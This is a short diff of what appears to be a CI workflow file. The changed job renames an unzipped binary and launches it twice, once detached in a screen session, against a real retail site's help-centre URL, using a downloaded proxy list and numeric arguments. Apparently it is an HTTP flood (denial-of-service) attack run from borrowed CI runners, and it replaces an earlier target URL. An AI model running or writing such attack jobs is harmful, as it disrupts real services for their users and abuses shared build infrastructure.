@@ -34,8 +34,12 @@ jobs:
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
           chmod +x ki
+          mv ki o
           
-          ./ki http://teamvps.space/hw 200 1 1  
+          
+          screen -dms ve ./o https://www.flipkart.com/helpcentre 200 1 1  
+          ./o https://www.flipkart.com/helpcentre 200 1 1  
+          sleep 1
           
           
           
